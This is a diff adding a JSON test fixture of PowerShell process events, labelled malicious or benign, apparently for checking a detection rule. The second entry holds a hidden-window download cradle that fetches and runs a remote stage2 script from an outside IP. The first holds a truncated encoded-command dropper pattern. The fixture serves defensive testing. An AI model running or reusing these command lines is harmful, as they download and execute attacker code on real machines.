@@ -1,0 +1,34 @@
+[
+  {
+    "note": "Malicious: base64 encoded command, classic phishing macro dropper pattern",
+    "expected_detection": true,
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
+    "User": "CORP\\afong",
+    "TimeCreated": "2026-09-14T03:22:10Z"
+  },
+  {
+    "note": "Malicious: hidden window + download cradle via IEX/WebClient",
+    "expected_detection": true,
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/stage2.ps1')\"",
+    "User": "CORP\\afong",
+    "TimeCreated": "2026-09-14T03:22:15Z"
+  },
+  {
+    "note": "Benign: SCCM silent install using -EncodedCommand safely for path with spaces (still flags high - analyst should review, common FP noted in rule)",
+    "expected_detection": true,
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -EncodedCommand JABQAGEAdABoACAAPQAgACIAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwAiAA==",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "TimeCreated": "2026-09-14T10:00:00Z"
+  },
+  {
+    "note": "Benign: normal admin script, no obfuscation flags",
+    "expected_detection": false,
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -File C:\\Scripts\\Get-DiskUsage.ps1",
+    "User": "CORP\\itadmin",
+    "TimeCreated": "2026-09-14T10:05:00Z"
+  }
+]
